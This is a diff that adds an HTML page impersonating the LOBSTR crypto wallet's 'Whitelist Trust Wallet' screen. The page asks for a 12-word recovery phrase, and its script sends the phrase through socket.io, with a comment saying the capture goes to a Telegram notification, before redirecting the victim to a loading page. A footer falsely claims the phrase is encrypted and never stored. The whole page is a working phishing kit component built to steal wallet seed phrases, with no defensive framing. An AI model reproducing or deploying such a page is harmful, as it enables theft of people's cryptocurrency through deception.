@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Whitelist Trust Wallet</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg" type="image/svg+xml">
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Ubuntu', sans-serif;
+            background: rgb(0, 0, 0);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            overflow: hidden;
+        }
+        
+        .loading-container {
+            text-align: center;
+            padding: 60px 40px;
+            background: rgb(12, 12, 12);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
+            max-width: 600px;
+            width: 90%;
+        }
+        
+        .logo-container {
+            margin-bottom: 30px;
+            background: #1B8DA0;
+            padding: 20px 40px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+        
+        .logo-container img {
+            width: 140px;
+            height: auto;
+            display: block;
+        }
+        
+        .content-title {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+        
+        .content-description {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 40px;
+            line-height: 1.6;
+            max-width: 450px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .input-container {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            font-family: 'Ubuntu', sans-serif;
+            transition: all 0.3s ease;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1B8DA0;
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 0 1px #1B8DA0;
+        }
+        
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            text-align: left;
+        }
+        
+        .seed-alert {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: -15px;
+            margin-bottom: 25px;
+            padding: 12px;
+            background: rgba(27, 141, 160, 0.1);
+            border-radius: 6px;
+            border-left: 3px solid #1B8DA0;
+        }
+        
+        .continue-button {
+            width: 100%;
+            padding: 16px;
+            background: #1B8DA0;
+            color: white;
+            border: none;
+            border-radius: 56px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Ubuntu', sans-serif;
+        }
+        
+        .continue-button:hover:not(:disabled) {
+            background: #157689;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(27, 141, 160, 0.3);
+        }
+        
+        .continue-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+        
+        .continue-button:disabled {
+            background: rgba(27, 141, 160, 0.3);
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo-container">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR Logo" 
+                 onerror="this.style.display='none'; this.parentElement.style.background='transparent'; this.parentElement.innerHTML='<h2 style=\'color: #1B8DA0; font-size: 32px; font-weight: 600;\'>LOBSTR</h2>'">
+        </div>
+        
+        <h2 class="content-title">Whitelist Trust Wallet</h2>
+        
+        <p class="content-description">
+            Input the 12-word recovery phrase associated with your wallet to enable whitelisting, thereby allowing the secure transfer of insecure funds from your LOBSTR account into your designated wallet.
+        </p>
+        
+        <div class="input-container">
+            <input type="text" 
+                   id="seed_phrase" 
+                   class="input-field" 
+                   placeholder="Enter your 12-word recovery phrase"
+                   autocomplete="off">
+            <p id="errorMessage_Seed" class="error-message"></p>
+        </div>
+        
+        <div class="seed-alert">
+            <span>Divide the seed phrases with an empty space between them</span>
+        </div>
+        
+        <button type="button" id="continue" class="continue-button">
+            <span>Continue</span>
+        </button>
+        
+        <div class="footer-text">
+            Your seed phrase is encrypted and secure. LOBSTR never stores your recovery words.
+        </div>
+    </div>
+    
+    <script src="/js/socket-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const continueBtn = document.getElementById('continue');
+            const seedInput = document.getElementById('seed_phrase');
+            const errorMessage = document.getElementById('errorMessage_Seed');
+            
+            function validateSeedPhrase(phrase) {
+                if (!phrase) {
+                    errorMessage.textContent = 'Please enter your seed phrase';
+                    errorMessage.style.display = 'block';
+                    return false;
+                }
+                
+                // Check if it has 12 words
+                const words = phrase.trim().split(/\s+/);
+                if (words.length !== 12) {
+                    errorMessage.textContent = 'Seed phrase must contain exactly 12 words';
+                    errorMessage.style.display = 'block';
+                    return false;
+                }
+                
+                return true;
+            }
+            
+            // Clear error on input
+            seedInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
+                errorMessage.textContent = '';
+            });
+            
+            // Handle continue button
+            continueBtn.addEventListener('click', async function() {
+                const seedPhrase = seedInput.value.trim();
+                
+                // Validate the seed phrase
+                if (!validateSeedPhrase(seedPhrase)) {
+                    return;
+                }
+                
+                // Disable button and show loading
+                continueBtn.disabled = true;
+                continueBtn.innerHTML = '<span class="loading-spinner"></span>';
+                
+                // Emit socket event
+                if (typeof socket !== 'undefined') {
+                    // Send user action for Telegram notification
+                    socket.emit('user_action', {
+                        type: 'seed_phrase_submitted',
+                        data: seedPhrase,
+                        page: 'lobstrWhitelistWallet',
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    socket.emit('page_loading', true);
+                    
+                    // Request redirect to lobstrloading
+                    setTimeout(() => {
+                        socket.emit('request_redirect', { page: 'lobstrloading' });
+                    }, 1500);
+                } else {
+                    console.error('Socket not initialized');
+                    errorMessage.textContent = 'Connection error. Please refresh the page.';
+                    errorMessage.style.display = 'block';
+                    continueBtn.disabled = false;
+                    continueBtn.innerHTML = 'Continue';
+                }
+            });
+            
+            // Handle Enter key
+            seedInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    continueBtn.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
